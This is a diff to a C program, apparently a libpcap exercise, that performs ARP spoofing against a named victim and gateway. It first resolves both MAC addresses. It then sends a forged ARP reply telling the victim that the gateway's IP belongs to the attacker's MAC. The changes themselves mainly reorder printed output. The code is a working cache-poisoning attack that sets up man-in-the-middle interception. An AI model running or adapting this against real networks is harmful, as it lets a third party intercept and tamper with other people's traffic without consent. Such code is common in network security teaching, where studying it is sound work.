@@ -29,10 +29,7 @@ int main(int argc, char *argv[])
 	argv_ip(argv[2], victim_ip);
 	argv_ip(argv[3], gate_ip);
 	my_mac(dev, attacker_mac);
-	printf("attacker mac addr : ");
-	print_mac(attacker_mac);
 	s_getIpAddress(dev, attacker_ip);
-	print_ip(attacker_ip);
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (pcap == nullptr)
@@ -42,13 +39,24 @@ int main(int argc, char *argv[])
 	}
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, gate_ip, 0);
 	reply(dev, pcap, gate_mac);
-	printf("target mac addr : ");
-	print_mac(gate_mac);
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
 	reply(dev, pcap, victim_mac);
+	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
+
+	printf("attacker ip addr : ");
+	print_ip(attacker_ip);
+	printf("sender ip addr : ");
+	print_ip(victim_ip);
+	printf("target ip addr : ");
+	print_ip(gate_ip);
+
+	printf("attacker mac addr : ");
+	print_mac(attacker_mac);
 	printf("sender mac addr : ");
 	print_mac(victim_mac);
-	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
+	printf("target mac addr : ");
+	print_mac(gate_mac);
+
 	return 0;
 	pcap_close(pcap);
 }
